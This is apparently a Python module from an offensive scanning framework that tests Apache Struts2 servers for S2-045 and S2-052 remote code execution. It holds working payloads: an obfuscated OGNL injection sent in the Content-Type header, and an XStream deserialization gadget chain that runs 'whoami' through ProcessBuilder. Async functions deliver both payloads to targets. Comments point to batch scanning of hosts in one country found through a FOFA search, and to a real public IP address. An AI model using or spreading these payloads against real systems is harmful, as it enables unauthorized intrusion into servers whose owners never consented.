# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-11 12:57

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: app="Struts2" && country="CN"
# python batch.py -m exploit.web.Apache.Struts(还没写).unauth_expression_rce -cs -fs "app=\"Struts2\" && country=\"CN\""
class Script(BaseScript):
    name = 'Struts2'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ['S2-045', 'S2-061']
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/']
        # exec
        # self.execPathList = ['/']
        self.poc = {
            'S2-045': '''%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('vulhub',233*233)}.multipart/form-data''',
            'S2_052': '''<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                    <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                        <is class="javax.crypto.CipherInputStream">
                            <cipher class="javax.crypto.NullCipher">
                                <initialized>false</initialized>
                                <opmode>0</opmode>
                                <serviceIterator class="javax.imageio.spi.FilterIterator">
                                    <iter class="javax.imageio.spi.FilterIterator">
                                        <iter class="java.util.Collections$EmptyIterator"/>
                                        <next class="java.lang.ProcessBuilder">
                                            <command>
                                                <string>whoami</string>
                                            </command>
                                            <redirectErrorStream>false</redirectErrorStream>
                                        </next>
                                    </iter>
                                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>foo</name>
                                    </filter>
                                    <next class="string">foo</next>
                                </serviceIterator>
                                <lock/>
                            </cipher>
                            <input class="java.lang.ProcessBuilder$NullInputStream"/>
                            <ibuffer></ibuffer>
                            <done>false</done>
                            <ostart>0</ostart>
                            <ofinish>0</ofinish>
                            <closed>false</closed>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
</map>'''
        }
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = {
            'S2_045': '''影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10''',
            'S2_052': '''影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12''',
        }

    async def S2_045(self, session, url):
        try:
            headers = self.headers.copy()
            headers.update({'Content-Type': self.poc.get('S2-045')})
            async with session.get(url=url, headers=headers, timeout=10, verify_ssl=False) as response:
                header = response.headers
                if int(header.get('vulhub')) == 54289:
                    tqdm.write(Fore.RED + '[{}] {}'.format('Struts2 S2_045 RCE', url))
                    return {'name': 'Struts2 S2_045 RCE', 'url': url, 'software': 'Struts2'}
        except Exception:
            return None

    async def S2_052(self, session, url):
        try:
            headers = {'Content-Type': 'application/xml'}
            async with session.post(url=url, data=self.poc.get('S2_052'), headers=headers, timeout=10,
                                    verify_ssl=False) as response:
                if response is not None and response.status == 500:
                    text = await response.text()
                    await asyncio.sleep(2)
                    if 'java.security.Provider$Service' in text:
                        tqdm.write(Fore.RED + '[{}] {}'.format('Struts2 S2-S2_052 RCE', url))
                        return {'name': 'Struts2 S2_052 RCE', 'url': url, 'software': 'Struts2'}
        except Exception:
            return None

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                url = f'http://{self.target}/' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}/'
                result1 = await self.S2_045(session, url)
                if result1 is not None:
                    return result1
                result3 = await self.S2_052(session, url)
                if result3 is not None:
                    return result3
        except Exception:
            return None

    # async def exec(self):
    #     try:
    #         async with aiohttp.ClientSession() as session:
    #             for execPath in self.execPathList:
    #                 url = f'http://{self.target}{execPath}' if self.target.startswith(
    #                     ('http:', 'https:')) is False else f'{self.target}{execPath}'
    #                 async with session.get(url=url, timeout=10, verify_ssl=False) as response:
    #                     if response is not None:
    #                         text = await response.text()
    #                         await asyncio.sleep(2)
    #                         if 'something about keywords in the web' in text:
    #                             tqdm.write(Fore.RED + '[{}] {}'.format('Struts2 RCE', url))
    #                             return {'name': 'Struts2 RCE', 'url': url, 'software': 'Struts2'}
    #     except Exception:
    #         return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8080', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
